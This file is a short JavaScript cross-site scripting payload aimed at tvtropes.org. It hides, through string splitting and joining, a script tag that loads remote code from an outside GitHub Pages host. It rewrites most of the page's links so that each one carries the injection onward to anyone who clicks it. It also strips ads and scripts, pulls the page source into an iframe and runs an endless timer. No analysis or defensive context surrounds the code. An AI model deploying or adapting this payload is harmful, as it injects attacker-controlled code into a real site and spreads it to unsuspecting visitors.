let grab = "<script>d=document;a=d['create'['concat']('Element')]('script');a['src']='//wyattbluezgithubzio/xsszjs'['split']('z')['join'](String(1/2)[1]);d['body']['append'['concat']('Child')](a)</script>";

try {
	document.getElementsByClassName('aka-title')[0].outerHTML="";
} catch(e){}

let spans;
let len;

spans = document.getElementsByTagName('a');
len = spans.length;
for(let i=len-1; i>=0; i--){
	let item = spans[i];
	if(item.href !== "https://tvtropes.org/" && item.href.includes('?') === false) {
		item.href+= "?from=Main."+grab;
	}
}


spans = document.getElementsByClassName('proper-ad-unit');
len = spans.length;
for(let i=len-1; i>=0; i--){
	let item = spans[i];
	item.outerHTML="";
}

spans = document.getElementsByTagName('script');
len = spans.length;
for(let i=len-1; i>=0; i--){
	let item = spans[i];
	item.outerHTML="";
}

let url = document.URL.substring(0,document.URL.indexOf('?'));
let frame = document.createElement('iframe');
frame.src=url+'?action=source';
document.body.append(frame);
let source = frame.contentWindow.document.body.innerHTML;

console.log(source);

let n = 0;
!function main(){
	n++;
	setTimeout(main,100);
}();

